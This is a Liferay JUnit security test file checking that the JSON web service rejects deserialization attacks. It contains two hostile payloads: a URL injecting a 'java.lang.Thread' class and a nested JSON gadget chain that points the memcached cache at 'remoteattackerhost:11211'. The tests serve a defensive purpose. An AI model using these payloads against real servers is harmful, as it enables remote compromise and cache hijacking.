/**
 * Copyright (c) 2000-2013 Liferay, Inc. All rights reserved.
 *
 * The contents of this file are subject to the terms of the Liferay Enterprise
 * Subscription License ("License"). You may not use this file except in
 * compliance with the License. You can obtain a copy of the License by
 * contacting Liferay, Inc. See the License for the specific language governing
 * permissions and limitations under the License, including but not limited to
 * distribution rights of the Software.
 *
 *
 *
 */

package com.liferay.portal.jsonwebservice;

import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
import com.liferay.portal.kernel.util.StringBundler;

import junit.framework.TestCase;

import org.junit.BeforeClass;
import org.junit.Test;

import org.springframework.mock.web.MockHttpServletRequest;

/**
 * @author Igor Spasic
 */
public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {

	@BeforeClass
	public static void setUpClass() throws Exception {
		initPortalServices();

		registerActionClass(OpenService.class);
	}

	@Test
	public void testAttack1() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception e) {
		}
	}

	@Test
	public void testAttack2() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run2");

		StringBundler sb = new StringBundler(15);

		sb.append("{\"class\":");
		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");

		sb.append("\"entityCache\":{\"class\":");
		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");

		sb.append("\"multiVMPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");

		sb.append("\"portalCacheManager\":{\"class\":");
		sb.append(
			"\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager");
		sb.append("\",\"timeout\":60,\"timeoutTimeUnit\":\"SECONDS\",");

		sb.append("\"memcachedClientPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.memcached.");
		sb.append("DefaultMemcachedClientFactory\",");

		sb.append("\"connectionFactory\":{\"class\":");
		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");

		mockHttpServletRequest.setParameter("bytes", sb.toString());

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception e) {
		}
	}

}